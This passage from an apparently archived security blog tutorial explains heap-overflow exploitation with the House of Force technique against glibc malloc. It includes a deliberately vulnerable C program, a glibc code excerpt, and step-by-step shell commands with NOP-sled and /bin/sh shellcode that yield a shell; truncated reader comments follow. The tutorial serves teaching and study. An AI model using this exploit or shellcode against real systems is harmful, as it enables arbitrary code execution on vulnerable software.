To conclude: the techniques in the Malloc Maleficarum are not applicable to our very simple example. All techniques require a sufficient (and controllable) amount of calls to free and/or malloc. Now, in sufficiently large programs there should be enough methods to trigger calls to free/malloc, possible making them exploitable. So the real problem is that&nbsp;<b>our example is not realistic:&nbsp;</b>it's just too simple! Therefore we will update the example so it matches a possible scenario we can actually exploit. The updated example is:<br>
<br>
<script src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/4704510.js"></script><link rel="stylesheet" href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/gist-embed-3702b6c62d5a21c09ed7e3135bfd0f3c14faeebf8e6380d852867face9ffb446.css"><div id="gist4704510" class="gist">
    <div class="gist-file">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-example-c" class="file">
    

  <div itemprop="text" class="blob-wrapper data type-c">
      <table class="highlight tab-size js-file-line-container" data-tab-size="8">
      <tbody><tr>
        <td id="file-example-c-L1" class="blob-num js-line-number" data-line-number="1"></td>
        <td id="file-example-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
      </tr>
      <tr>
        <td id="file-example-c-L2" class="blob-num js-line-number" data-line-number="2"></td>
        <td id="file-example-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>string.h<span class="pl-pds">&gt;</span></span></td>
      </tr>
      <tr>
        <td id="file-example-c-L3" class="blob-num js-line-number" data-line-number="3"></td>
        <td id="file-example-c-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdlib.h<span class="pl-pds">&gt;</span></span></td>
      </tr>
      <tr>
        <td id="file-example-c-L4" class="blob-num js-line-number" data-line-number="4"></td>
        <td id="file-example-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-example-c-L5" class="blob-num js-line-number" data-line-number="5"></td>
        <td id="file-example-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">char</span> *argv[])</td>
      </tr>
      <tr>
        <td id="file-example-c-L6" class="blob-num js-line-number" data-line-number="6"></td>
        <td id="file-example-c-LC6" class="blob-code blob-code-inner js-file-line">{</td>
      </tr>
      <tr>
        <td id="file-example-c-L7" class="blob-num js-line-number" data-line-number="7"></td>
        <td id="file-example-c-LC7" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">char</span> *buf1, *buf2, *buf3;</td>
      </tr>
      <tr>
        <td id="file-example-c-L8" class="blob-num js-line-number" data-line-number="8"></td>
        <td id="file-example-c-LC8" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (argc != <span class="pl-c1">4</span>) <span class="pl-k">return</span>;</td>
      </tr>
      <tr>
        <td id="file-example-c-L9" class="blob-num js-line-number" data-line-number="9"></td>
        <td id="file-example-c-LC9" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-example-c-L10" class="blob-num js-line-number" data-line-number="10"></td>
        <td id="file-example-c-LC10" class="blob-code blob-code-inner js-file-line">	buf1 = <span class="pl-c1">malloc</span>(<span class="pl-c1">256</span>);</td>
      </tr>
      <tr>
        <td id="file-example-c-L11" class="blob-num js-line-number" data-line-number="11"></td>
        <td id="file-example-c-LC11" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">strcpy</span>(buf1, argv[<span class="pl-c1">1</span>]);</td>
      </tr>
      <tr>
        <td id="file-example-c-L12" class="blob-num js-line-number" data-line-number="12"></td>
        <td id="file-example-c-LC12" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-example-c-L13" class="blob-num js-line-number" data-line-number="13"></td>
        <td id="file-example-c-LC13" class="blob-code blob-code-inner js-file-line">	buf2 = <span class="pl-c1">malloc</span>(<span class="pl-c1">strtoul</span>(argv[<span class="pl-c1">2</span>], <span class="pl-c1">NULL</span>, <span class="pl-c1">16</span>));</td>
      </tr>
      <tr>
        <td id="file-example-c-L14" class="blob-num js-line-number" data-line-number="14"></td>
        <td id="file-example-c-LC14" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-example-c-L15" class="blob-num js-line-number" data-line-number="15"></td>
        <td id="file-example-c-LC15" class="blob-code blob-code-inner js-file-line">	buf3 = <span class="pl-c1">malloc</span>(<span class="pl-c1">256</span>);</td>
      </tr>
      <tr>
        <td id="file-example-c-L16" class="blob-num js-line-number" data-line-number="16"></td>
        <td id="file-example-c-LC16" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">strcpy</span>(buf3, argv[<span class="pl-c1">3</span>]);</td>
      </tr>
      <tr>
        <td id="file-example-c-L17" class="blob-num js-line-number" data-line-number="17"></td>
        <td id="file-example-c-LC17" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-example-c-L18" class="blob-num js-line-number" data-line-number="18"></td>
        <td id="file-example-c-LC18" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">free</span>(buf3);</td>
      </tr>
      <tr>
        <td id="file-example-c-L19" class="blob-num js-line-number" data-line-number="19"></td>
        <td id="file-example-c-LC19" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">free</span>(buf2);</td>
      </tr>
      <tr>
        <td id="file-example-c-L20" class="blob-num js-line-number" data-line-number="20"></td>
        <td id="file-example-c-LC20" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">free</span>(buf1);</td>
      </tr>
      <tr>
        <td id="file-example-c-L21" class="blob-num js-line-number" data-line-number="21"></td>
        <td id="file-example-c-LC21" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-example-c-L22" class="blob-num js-line-number" data-line-number="22"></td>
        <td id="file-example-c-LC22" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
      </tr>
      <tr>
        <td id="file-example-c-L23" class="blob-num js-line-number" data-line-number="23"></td>
        <td id="file-example-c-LC23" class="blob-code blob-code-inner js-file-line">}</td>
      </tr>
</tbody></table>

  </div>

  </div>
  
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/vanhoefm/4704510/raw/1f15e7f36029e4fd0f64a4f84c705822936f293b/example.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/vanhoefm/4704510#file-example-c">example.c</a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<br>
It might seem like a big requirement that we can control the size given to the malloc call. This is not necessarily true. Imagine a (networked) service capable of caching objects. To cache an object first the size of the object is sent to the service, after which the object itself is transmitted. In such a program one can easily control the size given to a malloc call. Anyway, this example is something we can exploit, even when compiled against the latest glibc!<br>
<br>
<span style="font-size: large;"><b>Exploitation Technique: The House of Force</b></span><br>
<br>
Our example program nicely matches the requirements of the <i>House of Force</i> technique. This technique abuses the code responsible for allocating memory from the top chunk. This code is in&nbsp;_int_malloc: <br>
<br>
<script src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/4733332.js"></script><link rel="stylesheet" href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/gist-embed-3702b6c62d5a21c09ed7e3135bfd0f3c14faeebf8e6380d852867face9ffb446.css"><div id="gist4733332" class="gist">
    <div class="gist-file">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-malloc-malloc-c" class="file">
    

  <div itemprop="text" class="blob-wrapper data type-c">
      <table class="highlight tab-size js-file-line-container" data-tab-size="8">
      <tbody><tr>
        <td id="file-malloc-malloc-c-L1" class="blob-num js-line-number" data-line-number="1"></td>
        <td id="file-malloc-malloc-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">void</span>* <span class="pl-en">_int_malloc</span>(mstate av, <span class="pl-c1">size_t</span> bytes)</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L2" class="blob-num js-line-number" data-line-number="2"></td>
        <td id="file-malloc-malloc-c-LC2" class="blob-code blob-code-inner js-file-line">{</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L3" class="blob-num js-line-number" data-line-number="3"></td>
        <td id="file-malloc-malloc-c-LC3" class="blob-code blob-code-inner js-file-line">  INTERNAL_SIZE_T nb;             <span class="pl-c">/* normalized request size */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L4" class="blob-num js-line-number" data-line-number="4"></td>
        <td id="file-malloc-malloc-c-LC4" class="blob-code blob-code-inner js-file-line">  mchunkptr       victim;         <span class="pl-c">/* inspected/selected chunk */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L5" class="blob-num js-line-number" data-line-number="5"></td>
        <td id="file-malloc-malloc-c-LC5" class="blob-code blob-code-inner js-file-line">  INTERNAL_SIZE_T size;           <span class="pl-c">/* its size */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L6" class="blob-num js-line-number" data-line-number="6"></td>
        <td id="file-malloc-malloc-c-LC6" class="blob-code blob-code-inner js-file-line">  mchunkptr       <span class="pl-c1">remainder</span>;      <span class="pl-c">/* remainder from a split */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L7" class="blob-num js-line-number" data-line-number="7"></td>
        <td id="file-malloc-malloc-c-LC7" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">unsigned</span> <span class="pl-k">long</span>   remainder_size; <span class="pl-c">/* its size */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L8" class="blob-num js-line-number" data-line-number="8"></td>
        <td id="file-malloc-malloc-c-LC8" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L9" class="blob-num js-line-number" data-line-number="9"></td>
        <td id="file-malloc-malloc-c-LC9" class="blob-code blob-code-inner js-file-line">  <span class="pl-c1">checked_request2size</span>(bytes, nb);</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L10" class="blob-num js-line-number" data-line-number="10"></td>
        <td id="file-malloc-malloc-c-LC10" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L11" class="blob-num js-line-number" data-line-number="11"></td>
        <td id="file-malloc-malloc-c-LC11" class="blob-code blob-code-inner js-file-line">  [...]</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L12" class="blob-num js-line-number" data-line-number="12"></td>
        <td id="file-malloc-malloc-c-LC12" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L13" class="blob-num js-line-number" data-line-number="13"></td>
        <td id="file-malloc-malloc-c-LC13" class="blob-code blob-code-inner js-file-line">  victim = av-&gt;top;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L14" class="blob-num js-line-number" data-line-number="14"></td>
        <td id="file-malloc-malloc-c-LC14" class="blob-code blob-code-inner js-file-line">  size = <span class="pl-c1">chunksize</span>(victim);</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L15" class="blob-num js-line-number" data-line-number="15"></td>
        <td id="file-malloc-malloc-c-LC15" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">if</span> ((<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)(size) &gt;= (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)(nb + MINSIZE))</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L16" class="blob-num js-line-number" data-line-number="16"></td>
        <td id="file-malloc-malloc-c-LC16" class="blob-code blob-code-inner js-file-line">  {</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L17" class="blob-num js-line-number" data-line-number="17"></td>
        <td id="file-malloc-malloc-c-LC17" class="blob-code blob-code-inner js-file-line">    remainder_size = size - nb;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L18" class="blob-num js-line-number" data-line-number="18"></td>
        <td id="file-malloc-malloc-c-LC18" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">remainder</span> = <span class="pl-c1">chunk_at_offset</span>(victim, nb);</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L19" class="blob-num js-line-number" data-line-number="19"></td>
        <td id="file-malloc-malloc-c-LC19" class="blob-code blob-code-inner js-file-line">    av-&gt;top = <span class="pl-c1">remainder</span>;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L20" class="blob-num js-line-number" data-line-number="20"></td>
        <td id="file-malloc-malloc-c-LC20" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">set_head</span>(victim, nb | PREV_INUSE | (av!=&amp;main_arena ? NON_MAIN_ARENA : <span class="pl-c1">0</span>));</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L21" class="blob-num js-line-number" data-line-number="21"></td>
        <td id="file-malloc-malloc-c-LC21" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">set_head</span>(<span class="pl-c1">remainder</span>, remainder_size | PREV_INUSE);</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L22" class="blob-num js-line-number" data-line-number="22"></td>
        <td id="file-malloc-malloc-c-LC22" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L23" class="blob-num js-line-number" data-line-number="23"></td>
        <td id="file-malloc-malloc-c-LC23" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">check_malloced_chunk</span>(av, victim, nb);</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L24" class="blob-num js-line-number" data-line-number="24"></td>
        <td id="file-malloc-malloc-c-LC24" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p = <span class="pl-c1">chunk2mem</span>(victim);</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L25" class="blob-num js-line-number" data-line-number="25"></td>
        <td id="file-malloc-malloc-c-LC25" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">__builtin_expect</span> (perturb_byte, <span class="pl-c1">0</span>))</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L26" class="blob-num js-line-number" data-line-number="26"></td>
        <td id="file-malloc-malloc-c-LC26" class="blob-code blob-code-inner js-file-line">      <span class="pl-c1">alloc_perturb</span> (p, bytes);</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L27" class="blob-num js-line-number" data-line-number="27"></td>
        <td id="file-malloc-malloc-c-LC27" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> p;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L28" class="blob-num js-line-number" data-line-number="28"></td>
        <td id="file-malloc-malloc-c-LC28" class="blob-code blob-code-inner js-file-line">  }</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L29" class="blob-num js-line-number" data-line-number="29"></td>
        <td id="file-malloc-malloc-c-LC29" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L30" class="blob-num js-line-number" data-line-number="30"></td>
        <td id="file-malloc-malloc-c-LC30" class="blob-code blob-code-inner js-file-line">  [...]</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L31" class="blob-num js-line-number" data-line-number="31"></td>
        <td id="file-malloc-malloc-c-LC31" class="blob-code blob-code-inner js-file-line">}</td>
      </tr>
</tbody></table>

  </div>

  </div>
  
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/vanhoefm/4733332/raw/2aa5da4ad0f1ef384d7aa319a4a5ff97024462ba/malloc%5Cmalloc.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/vanhoefm/4733332#file-malloc-malloc-c">malloc\malloc.c</a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<br>
The goal is to overwrite av-&gt;top with a user controllable value. The av-&gt;top variable always points to the top chunk. During a call to malloc this variable is used to get a reference to the top chunk (in case no other chunks could fulfill the request)<b>.</b>&nbsp;This means that if we control the value of av-&gt;top, and we can force a call to malloc which uses the top chunk, we control where the next chunk will be allocated (i.e. we control the return value of malloc in line 15 of the example). Consequently we can write arbitrary bytes to any address using line 16.<br>
<br>
To make sure the appropriate code gets executed the if-test in line 15 must evaluate to true. This test checks whether the top chunk is large enough to contain the requested chunk (and if enough space remains for the metadata in the top chunk). We want to assure that any request (of arbitrary large&nbsp;size) will use the top chunk. To accomplish this we abuse the overflow in line 11 to overwrite the metadata of the top chunk. First we write 256 bytes to fill up the allocated space, then 4 bytes to overwrite prev_size, and we finally overwrite the size with the largest possible (unsigned) integer:<br>
<blockquote class="tr_bq">
LARGETOPCHUNK=$(perl -e 'print "A"x260 . "\xFF\xFF\xFF\xFF"')<br>
./example $LARGETOPCHUNK 1 2
</blockquote>
The above won't actually exploit the program, since more steps are needed. But feel free to use a debugger and confirm that the size of the top chunk is indeed modified. We continue by overwriting the variable av-&gt;top. Our goal is to make it point <b>8 bytes before</b> the <a href="http://www.iecc.com/linker/linker10.html">GOT entry</a> of free. The GOT table is where pointers to dynamically loaded functions are stored. So if we're able to overwrite the pointer to free, we can make the program jump to an arbitrary location (and in particular to our shellcode). To find out the address of the got.plt entry execute:<br>
<blockquote class="tr_bq">
readelf --relocs example</blockquote>
In my case free was located at&nbsp;0804a008, which subtracted by 8 becomes&nbsp;<b>0x804a000</b>. The value being written to av-&gt;top is calculated by chunk_at_offset:<br>
<blockquote class="tr_bq">
/* Treat space at ptr + offset as a chunk */<br>
#define chunk_at_offset(p, s) &nbsp;((mchunkptr)(((char*)(p)) + (s)))</blockquote>
We control the second argument: nb (in the #define called s). By debugging the program I found that victim (the older value for av-&gt;top) was&nbsp;<b>0x804b110</b>. Hence the value passed to malloc should be&nbsp;<b>0x804a000 -&nbsp;</b><b>0x804b110 = &nbsp;FFFFEEF0.</b> We now get:<br>
<blockquote class="tr_bq">
LARGETOPCHUNK=$(perl -e 'print "A"x260 . "\xFF\xFF\xFF\xFF"')<br>
./example $LARGETOPCHUNK FFFFEEF0 AAAA</blockquote>
Resulting in a segfault with eip set to 0x41414141 (= the byte encoding of AAAA)! The final step is to point eip to a location under our control. Let's assume ASLR is disabled, so the stack is always at a fixed location. In my case it starts at 0xBFFFFFFF. All that remains is to construct a NOP slide, inject the shellcode, and make eip point towards the NOP slide:<br>
<blockquote class="tr_bq">
LARGETOPCHUNK=$(perl -e 'print "A"x260 . "\xFF\xFF\xFF\xFF"')<br>
NOPS=$(perl -e 'print "\x90"x 0x10000')<br>
SC=$'\x68\x2f\x73\x68\x5a\x68\x2f\x62\x69\x6e\x89\xe7\x31\xc0\x88\x47\x07\x8d\x57\x0c\x89\x02\x8d\x4f\x08\x89\x39\x89\xfb\xb0\x0b\xcd\x80'<br>
STACKADDR=$'\x01\xC0\xFF\xBF'<br>
env -i "A=$NOPS$SC" ./example $LARGETOPCHUNK FFFFEEF0 $STACKADDR</blockquote>
<b>Hell yeah! We are now greeted by a nice sh shell! =)</b><br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="http://3.bp.blogspot.com/-UPwcoH6aRk8/URRJT7AB8eI/AAAAAAAAAPs/GbnbpMAQz68/s1600/success_kid-other.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/success_kid-other.jpg" height="265" width="400"></a></div>
<div style="text-align: center;">
<i>Ahhh, the joy of success!</i></div>
<br>
A few final remarks are in place. First, we used a large NOP slide. This makes it a lot easier to get the stack address (the third argument) correct. Second, the first byte of $STACKADDR starts with 1. This is done to avoid if from containing a NULL byte (which would terminate the string). Finally we placed the NOP slide and shell code into environment variables, and used the <a href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html">env command</a> to clear all other environment variables (resulting in more predictable behaviour of the exploit).<br>
<br>
Additionally we could've beaten ASLR by a simple brute force, as we are working on a 32 bit platform. In case DEP is enabled our shellcode on the stack would not be executable, and we would have to fall back on <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return Oriented Programming (ROP)</a>. This requires controlling the value of esp, which can be done by overwriting the value of a saved frame-pointer (saved ebp value).<br>
<br>
<b><span style="font-size: large;">Conclusion</span></b><br>
<br>
We have successfully exploited the second example program. Additionally it was explained how both DEP and ASLR can be bypassed.<br>
<br>
<span style="font-size: large;"><b>References</b></span><br>
<br>
[1]&nbsp;Justin N. Ferguson, <a href="https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf">Understanding the heap by breaking it</a>. Blackhat USA, 2007.<br>
[2]&nbsp;J. Koziol, D. Litchﬁeld, D. Aitel, C. Anley, S. Eren, N. Mehta, and R. Hassell. <a href="https://www.google.com/search?btnG=1&amp;pws=0&amp;q=The+Shellcoder%E2%80%99s+Handbook%3A+Discovering+and+Exploiting+Security+Holes">The Shellcoder’s Handbook: Discovering and Exploiting Security Holes</a>. Wiley, 2003.<br>
[3]&nbsp;Doug Lea, <a href="http://gee.cs.oswego.edu/dl/html/malloc.html">Design of dlmalloc: A Memory Allocator</a>. Personal website.<br>
[4]&nbsp;Andries Brouwer, <a href="http://www.win.tue.nl/~aeb/linux/hh/hh-11.html">Hackers Hut:&nbsp;Exploiting the heap</a>.<br>
[5]&nbsp;<span style="white-space: pre-wrap;">Phantasmal Phantasmagoria, </span><span style="white-space: pre-wrap;"><a href="http://packetstormsecurity.com/files/view/40638/MallocMaleficarum.txt">The Malloc Maleficarum</a>. </span><span style="white-space: pre-wrap;">bugtraq mailing list, 2005.</span><br>
[6]&nbsp;<span style="white-space: pre-wrap;">blackngel, </span><span style="white-space: pre-wrap;"><a href="http://www.phrack.org/issues.html?issue=66&amp;id=10&amp;mode=txt">Malloc Des-Maleficarum</a>. </span><span style="white-space: pre-wrap;">Phrack </span><span style="white-space: pre-wrap;">Volume 0x0d, Issue 0x42, 2009.</span><br>
<span style="white-space: pre-wrap;">[7] MaXX, </span><span style="white-space: pre-wrap;"><a href="http://www.phrack.org/issues.html?issue=57&amp;id=8&amp;mode=txt">Vudo malloc tricks</a>.&nbsp;</span><span style="white-space: pre-wrap;">Phrack </span><span style="white-space: pre-wrap;">Volume 0x0b, Issue 0x39, 2001.</span>
<div style="clear: both;"></div>
</div>
<div class="post-footer">
<div class="post-footer-line post-footer-line-1"><span class="post-author vcard">
Geplaatst door
<span class="fn">Mathy</span>
</span>
<span class="post-timestamp">
op
<a class="timestamp-link" href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html" rel="bookmark" title="permanent link"><abbr class="published" title="2013-02-08T01:50:00+01:00">01:50</abbr></a>
</span>
<span class="post-comment-link">
</span>
<span class="post-icons">
<span class="item-control blog-admin pid-606357465">
<a href="https://www.blogger.com/post-edit.g?blogID=3500917063499850097&amp;postID=1709971016142527507&amp;from=pencil" title="Edit Post">
<img alt="" class="icon-action" height="18" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon18_edit_allbkg.gif" width="18">
</a>
</span>
</span>
<div class="post-share-buttons goog-inline-block">
<a class="goog-inline-block share-button sb-email" href="https://www.blogger.com/share-post.g?blogID=3500917063499850097&amp;postID=1709971016142527507&amp;target=email" target="_blank" title="Email This"><span class="share-button-link-text">Email This</span></a><a class="goog-inline-block share-button sb-blog" href="https://www.blogger.com/share-post.g?blogID=3500917063499850097&amp;postID=1709971016142527507&amp;target=blog" onclick="window.open(this.href, &quot;_blank&quot;, &quot;height=270,width=475&quot;); return false;" target="_blank" title="BlogThis!"><span class="share-button-link-text">BlogThis!</span></a><a class="goog-inline-block share-button sb-twitter" href="https://www.blogger.com/share-post.g?blogID=3500917063499850097&amp;postID=1709971016142527507&amp;target=twitter" target="_blank" title="Share to Twitter"><span class="share-button-link-text">Share to Twitter</span></a><a class="goog-inline-block share-button sb-facebook" href="https://www.blogger.com/share-post.g?blogID=3500917063499850097&amp;postID=1709971016142527507&amp;target=facebook" onclick="window.open(this.href, &quot;_blank&quot;, &quot;height=430,width=640&quot;); return false;" target="_blank" title="Share to Facebook"><span class="share-button-link-text">Share to Facebook</span></a><a class="goog-inline-block share-button sb-pinterest" href="https://www.blogger.com/share-post.g?blogID=3500917063499850097&amp;postID=1709971016142527507&amp;target=pinterest" target="_blank" title="Share to Pinterest"><span class="share-button-link-text">Share to Pinterest</span></a><div class="goog-inline-block google-plus-share-container"><div id="___plusone_0" style="text-indent: 0px; margin: 0px; padding: 0px; border-style: none; float: none; line-height: normal; font-size: 1px; vertical-align: baseline; display: inline-block; width: 300px; height: 20px; background: transparent;"><iframe frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" style="position: static; top: 0px; width: 300px; margin: 0px; border-style: none; left: 0px; visibility: visible; height: 20px;" tabindex="0" vspace="0" width="100%" id="I0_1470688962206" name="I0_1470688962206" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/fastbutton.html" data-gapiattached="true" title="+1"></iframe></div></div>
</div>
<span class="post-backlinks post-comment-link">
</span>
</div>
<div class="post-footer-line post-footer-line-2"><span class="post-labels">
Labels:
<a href="http://www.mathyvanhoef.com/search/label/exploits" rel="tag">exploits</a>
</span>
</div>
<div class="post-footer-line post-footer-line-3"><span class="post-location">
</span>
</div>
</div>
</div>
<div class="comments" id="comments">
<a name="comments"></a>
<h4>7 comments:</h4>
<div class="comments-content">
<script async="async" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/comments.js" type="text/javascript"></script>
<script type="text/javascript">
    (function() {
      var items = [{'id': '5536168287748300702', 'body': 'Really good read!', 'timestamp': '1380008993151', 'permalink': 'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment\x3d1380008993151#c5536168287748300702', 'author': {'name': 'Anonymous', 'avatarUrl': '//img1.blogblog.com/img/blank.gif', 'profileUrl': ''}, 'displayTime': '24 September 2013 at 09:49', 'deleteclass': 'item-control blog-admin pid-1768098087'}, {'id': '6625724024262953766', 'body': 'Thanks a lot for the article! Everything was explained nicely, and without assuming prior knowledge, which was what I needed :-) all the other articles assume too much', 'timestamp': '1382174352989', 'permalink': 'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment\x3d1382174352989#c6625724024262953766', 'author': {'name': 'Anonymous', 'avatarUrl': '//img1.blogblog.com/img/blank.gif', 'profileUrl': ''}, 'displayTime': '19 October 2013 at 11:19', 'deleteclass': 'item-control blog-admin pid-1844850874'}, {'id': '7060743476201140147', 'body': 'Hi, Thanks a lot. Which version of gcc did you use?', 'timestamp': '1400941374777', 'permalink': 'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment\x3d1400941374777#c7060743476201140147', 'author': {'name': 'Dharma', 'avatarUrl': '//img2.blogblog.com/img/b16-rounded.gif', 'profileUrl': 'https://www.blogger.com/profile/16746531841359451416'}, 'displayTime': '24 May 2014 at 16:22', 'deleteclass': 'item-control blog-admin pid-2115464180'}, {'id': '5751604748758866367', 'body': 'Where is Updated example ? its not visible', 'timestamp': '1403371897506', 'permalink': 'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment\x3d1403371897506#c5751604748758866367', 'author': {'name': 'Anonymous', 'avatarUrl': '//img1.blogblog.com/img/blank.gif', 'profileUrl': ''}, 'displayTime': '21 June 2014 at 19:31', 'deleteclass': 'item-control blog-admin pid-452415535'}, {'id': '4259282045714051864', 'body': 'It should be visible? Try to enable javascript (I have to fix it so it all works without JS... one day).', 'timestamp': '1403558611454', 'permalink': 'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment\x3d1403558611454#c4259282045714051864', 'author': {'name': 'Mathy', 'avatarUrl': '//img2.blogblog.com/img/b16-rounded.gif', 'profileUrl': 'https://www.blogger.com/profile/12266874794108836514'}, 'displayTime': '23 June 2014 at 23:23', 'deleteclass': 'item-control blog-admin pid-606357465'}, {'id': '6659840930558450761', 'body': 'Good stuff sir !!!!!!!!!', 'timestamp': '1422507408199', 'permalink': 'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment\x3d1422507408199#c6659840930558450761', 'author': {'name': 'Anonymous', 'avatarUrl': '//img1.blogblog.com/img/blank.gif', 'profileUrl': ''}, 'displayTime': '29 January 2015 at 05:56', 'deleteclass': 'item-control blog-admin pid-897731422'}, {'id': '2871692304115527012', 'body': 'Great stuff!\x3cbr /\x3eI\x26#39;m checking the trunk layout under 64bit ubuntu. But found out that it\x26#39;s not like what expected:\x3cbr /\x3e\x3cbr /\x3e0x601ff0: 0x00000000 0x00000000 0x00000000 0x00000000\x3cbr /\x3e0x602000: 0x00000000 0x00000000 0x00000031 0x00000000\x3cbr /\x3e0x602010: 0x41414141 0x41414141 0x41414141 0x41414141\x3cbr /\x3e0x602020: 0x41414141 0x41414141 0x41414141 0x41414141\x3cbr /\x3e\x3cbr /\x3eThis is the trunk of malloc(32).\x3cbr /\x3eThe \x26quot;0x00000031\x26quot; is correct( 48 bytes of overall size of trunk)\x3cbr /\x3ebut the the \x26#39;prev_size\x26#39;, \x26#39;fd\x26#39;, \x26#39;bk\x26#39; are all 0.\x3cbr /\x3eDo you happen to know why?\x3cbr /\x3e\x3cbr /\x3e', 'timestamp': '1436935304875', 'permalink': 